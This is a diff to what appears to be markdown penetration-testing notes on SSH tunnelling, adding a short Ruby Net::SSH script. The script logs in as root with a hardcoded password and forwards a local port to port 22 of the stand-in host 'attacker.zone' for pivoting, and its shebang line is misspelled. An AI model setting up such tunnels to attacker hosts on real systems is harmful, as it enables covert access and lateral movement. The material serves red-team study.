@@ -41,6 +41,18 @@ https://gist.github.com/KINGSABRI/2860989
                               |-----------------|-----------------|
 ```
 
+```ruby
+#!/usr/bin/evn ruby
+
+require 'net/ssh'
+
+Net::SSH.start("127.0.0.1", 'root', :password => '123132') do |ssh|
+  # Forward connections on local port 1234 to port 22 of attacker.zone
+  ssh.forward.local(1234, "attacker.zone", 22)
+  puts "[+] Starting SSH forward tunnel"
+  ssh.loop { true }
+end
+```
 
 ### Reverse SSH Tunnel 
 ```
